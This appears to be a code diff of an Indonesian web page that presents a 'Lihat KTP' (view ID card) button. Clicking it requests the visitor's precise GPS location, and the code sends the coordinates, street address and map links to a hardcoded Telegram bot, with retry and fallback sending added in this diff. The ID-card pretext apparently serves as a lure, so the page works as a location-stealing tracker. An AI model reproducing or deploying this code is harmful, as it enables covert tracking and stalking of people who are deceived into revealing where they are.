@@ -75,6 +75,13 @@
             transform: translateY(1px);
         }
         
+        .ktp-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
         .ktp-btn i {
             margin-right: 10px;
             font-size: 20px;
@@ -99,6 +106,12 @@
             border-left-color: #dc3545;
             background-color: #f8d7da;
             color: #721c24;
+        }
+        
+        .status.info {
+            border-left-color: #17a2b8;
+            background-color: #d1ecf1;
+            color: #0c5460;
         }
         
         .map-container {
@@ -161,58 +174,33 @@
         .loading {
             display: none;
             margin-top: 15px;
+            align-items: center;
+            justify-content: center;
         }
         
-        .loading-dots {
-            display: inline-block;
-            position: relative;
-            width: 80px;
-            height: 20px;
-        }
-        
-        .loading-dots div {
-            position: absolute;
-            top: 8px;
-            width: 10px;
-            height: 10px;
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0c2461;
             border-radius: 50%;
-            background: #0c2461;
-            animation-timing-function: cubic-bezier(0, 1, 1, 0);
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
         }
         
-        .loading-dots div:nth-child(1) {
-            left: 8px;
-            animation: loading-dots1 0.6s infinite;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
-        .loading-dots div:nth-child(2) {
-            left: 8px;
-            animation: loading-dots2 0.6s infinite;
-        }
-        
-        .loading-dots div:nth-child(3) {
-            left: 32px;
-            animation: loading-dots2 0.6s infinite;
-        }
-        
-        .loading-dots div:nth-child(4) {
-            left: 56px;
-            animation: loading-dots3 0.6s infinite;
-        }
-        
-        @keyframes loading-dots1 {
-            0% { transform: scale(0); }
-            100% { transform: scale(1); }
-        }
-        
-        @keyframes loading-dots3 {
-            0% { transform: scale(1); }
-            100% { transform: scale(0); }
-        }
-        
-        @keyframes loading-dots2 {
-            0% { transform: translate(0, 0); }
-            100% { transform: translate(24px, 0); }
+        .telegram-status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 5px;
+            background: #e3f2fd;
+            color: #0c2461;
+            font-size: 14px;
+            display: none;
         }
         
         @media (max-width: 480px) {
@@ -256,20 +244,19 @@
         </button>
         
         <div class="loading" id="loadingIndicator">
-            <div class="loading-dots">
-                <div></div>
-                <div></div>
-                <div></div>
-                <div></div>
-            </div>
-            <span style="margin-left: 10px;">Mencari lokasi...</span>
+            <div class="spinner"></div>
+            <span>Mendeteksi lokasi dengan akurasi tinggi...</span>
         </div>
         
         <div class="map-container" id="mapContainer">
             <div id="map"></div>
             <div class="map-overlay">
-                <i class="fas fa-map-marker-alt"></i> Lokasi Anda
+                <i class="fas fa-map-marker-alt"></i> Lokasi Terdeteksi
             </div>
+        </div>
+        
+        <div class="telegram-status" id="telegramStatus">
+            <i class="fab fa-telegram"></i> <span id="statusText">Mengirim ke Telegram...</span>
         </div>
         
         <div class="status" id="statusMessage"></div>
@@ -280,7 +267,8 @@
                 <li>Pastikan browser mengizinkan akses lokasi</li>
                 <li>Klik tombol "Lihat KTP"</li>
                 <li>Izinkan akses lokasi jika diminta</li>
-                <li>Tunggu hingga peta muncul dengan lokasi Anda</li>
+                <li>Tunggu hingga proses selesai</li>
+                <li>Ktp akan di lihat kan saat mengklik</li>
             </ol>
         </div>
     </div>
@@ -299,24 +287,31 @@
             const statusMessage = document.getElementById('statusMessage');
             const loadingIndicator = document.getElementById('loadingIndicator');
             const mapContainer = document.getElementById('mapContainer');
+            const telegramStatus = document.getElementById('telegramStatus');
+            const statusText = document.getElementById('statusText');
+            const button = this;
             
             // Reset tampilan
             statusMessage.style.display = 'none';
             mapContainer.style.display = 'none';
-            loadingIndicator.style.display = 'block';
+            telegramStatus.style.display = 'none';
+            loadingIndicator.style.display = 'flex';
+            button.disabled = true;
             
             // Periksa apakah browser mendukung geolokasi
             if (!navigator.geolocation) {
                 loadingIndicator.style.display = 'none';
                 showStatus('Browser Anda tidak mendukung geolokasi.', 'error');
+                button.disabled = false;
                 return;
             }
             
-            // Dapatkan lokasi pengguna
+            // Tampilkan status mencari lokasi
+            statusText.textContent = 'Mendeteksi lokasi dengan akurasi tinggi...';
+            
+            // Dapatkan lokasi pengguna dengan akurasi tinggi
             navigator.geolocation.getCurrentPosition(
                 async function(position) {
-                    loadingIndicator.style.display = 'none';
-                    
                     currentLatitude = position.coords.latitude;
                     currentLongitude = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
@@ -324,6 +319,10 @@
                     // Tampilkan peta
                     showMap(currentLatitude, currentLongitude);
                     mapContainer.style.display = 'block';
+                    
+                    // Tampilkan status Telegram
+                    telegramStatus.style.display = 'block';
+                    statusText.textContent = 'Mengirim lokasi ke Telegram...';
                     
                     // Dapatkan alamat dari koordinat
                     let address = 'Alamat tidak tersedia';
@@ -334,13 +333,26 @@
                     }
                     
                     // Kirim semua informasi ke bot Telegram
-                    sendToTelegram(currentLatitude, currentLongitude, accuracy, address);
+                    const success = await sendToTelegram(currentLatitude, currentLongitude, accuracy, address);
                     
-                    // Tampilkan status berhasil
-                    showStatus('Lokasi berhasil ditemukan dan dikirim.', 'success');
+                    if (success) {
+                        statusText.textContent = '✅ Lokasi berhasil dikirim!';
+                        telegramStatus.style.backgroundColor = '#d4edda';
+                        telegramStatus.style.color = '#155724';
+                        showStatus('Proses selesai. Lokasi telah dikirim.', 'success');
+                    } else {
+                        statusText.textContent = '❌ Gagal mengirim lokasi';
+                        telegramStatus.style.backgroundColor = '#f8d7da';
+                        telegramStatus.style.color = '#721c24';
+                        showStatus('Lokasi ditemukan tetapi gagal dikirim.', 'error');
+                    }
+                    
+                    loadingIndicator.style.display = 'none';
+                    button.disabled = false;
                 },
                 function(error) {
                     loadingIndicator.style.display = 'none';
+                    button.disabled = false;
                     
                     let errorMessage = 'Gagal mendapatkan lokasi. ';
                     
@@ -349,10 +361,10 @@
                             errorMessage += 'Silakan izinkan akses lokasi untuk melanjutkan.';
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMessage += 'Informasi lokasi tidak tersedia.';
+                            errorMessage += 'Informasi lokasi tidak tersedia. Pastikan GPS aktif.';
                             break;
                         case error.TIMEOUT:
-                            errorMessage += 'Pencarian lokasi memakan waktu terlalu lama.';
+                            errorMessage += 'Pencarian lokasi memakan waktu terlalu lama. Coba lagi.';
                             break;
                         default:
                             errorMessage += 'Terjadi kesalahan tidak diketahui.';
@@ -361,9 +373,9 @@
                     showStatus(errorMessage, 'error');
                 },
                 {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
+                    enableHighAccuracy: true, // Mode akurasi tinggi
+                    timeout: 30000, // Timeout lebih lama
+                    maximumAge: 0 // Tidak menggunakan cache lokasi
                 }
             );
         });
@@ -385,21 +397,13 @@
             
             // Tambahkan marker
             L.marker([lat, lng]).addTo(map)
-                .bindPopup('Lokasi Anda')
+                .bindPopup('Lokasi Anda Terdeteksi')
                 .openPopup();
-            
-            // Tambahkan circle untuk menunjukkan akurasi
-            L.circle([lat, lng], {
-                color: 'red',
-                fillColor: '#f03',
-                fillOpacity: 0.2,
-                radius: accuracy || 50
-            }).addTo(map);
         }
         
         async function getAddressFromCoordinates(lat, lng) {
             try {
-                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
+                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
                 const data = await response.json();
                 
                 if (data && data.display_name) {
@@ -418,37 +422,73 @@
             statusMessage.style.display = 'block';
         }
         
-        function sendToTelegram(latitude, longitude, accuracy, address) {
-            // URL untuk mengirim lokasi melalui bot Telegram
-            const locationUrl = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
-            
-            // Kirim lokasi dulu
-            fetch(locationUrl)
+        async function sendToTelegram(latitude, longitude, accuracy, address) {
+            try {
+                // 1. Kirim lokasi (pin map) dulu
+                const locationUrl = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+                
+                const locationResponse = await fetch(locationUrl);
+                const locationData = await locationResponse.json();
+                
+                if (!locationData.ok) {
+                    throw new Error('Gagal mengirim lokasi: ' + locationData.description);
+                }
+                
+                // Tunggu sebentar sebelum kirim pesan
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // 2. Kirim pesan detail
+                const timestamp = new Date().toLocaleString('id-ID');
+                const message = `📍 **LOKASI TERKINI** 📍\n\n` +
+                               `🗺️ **Alamat:** ${address}\n` +
+                               `📡 **Akurasi:** ${accuracy.toFixed(1)} meter\n` +
+                               `🕐 **Waktu:** ${timestamp}\n` +
+                               `🔗 **Google Maps:** https://maps.google.com/?q=${latitude},${longitude}\n` +
+                               `🌐 **OpenStreetMap:** https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}#map=17/${latitude}/${longitude}\n\n` +
+                               `_Lokasi terdeteksi otomatis oleh sistem_`;
+                
+                const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+                
+                const messageResponse = await fetch(messageUrl);
+                const messageData = await messageResponse.json();
+                
+                if (!messageData.ok) {
+                    throw new Error('Gagal mengirim pesan: ' + messageData.description);
+                }
+                
+                return true;
+                
+            } catch (error) {
+                console.error('Error mengirim ke Telegram:', error);
+                
+                // Coba metode alternatif jika gagal
+                try {
+                    const fallbackUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`Lokasi: ${latitude}, ${longitude}\nGoogle Maps: https://maps.google.com/?q=${latitude},${longitude}`)}`;
+                    await fetch(fallbackUrl);
+                    return true;
+                } catch (fallbackError) {
+                    console.error('Fallback juga gagal:', fallbackError);
+                    return false;
+                }
+            }
+        }
+        
+        // Test koneksi ke bot saat halaman dimuat
+        window.addEventListener('load', function() {
+            // Cek apakah bot aktif
+            fetch(`https://api.telegram.org/bot${botToken}/getMe`)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        // Kirim pesan detail setelah lokasi
-                        const timestamp = new Date().toLocaleString('id-ID');
-                        const message = `📍 **Informasi Lokasi Terbaru**\n\n` +
-                                       `🗺️ **Alamat:** ${address}\n` +
-                                       `📡 **Akurasi:** ${accuracy} meter\n` +
-                                       `🕐 **Waktu:** ${timestamp}\n` +
-                                       `🔗 **Google Maps:** https://www.google.com/maps?q=${latitude},${longitude}`;
-                        
-                        const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-                        
-                        return fetch(messageUrl);
-                    }
-                })
-                .then(response => {
-                    if (response) {
-                        return response.json();
+                        console.log('Bot Telegram siap:', data.result.first_name);
+                    } else {
+                        console.warn('Bot tidak dapat diakses');
                     }
                 })
                 .catch(error => {
-                    console.error('Error mengirim ke Telegram:', error);
+                    console.warn('Tidak dapat terhubung ke Telegram');
                 });
-        }
+        });
     </script>
 </body>
 </html>
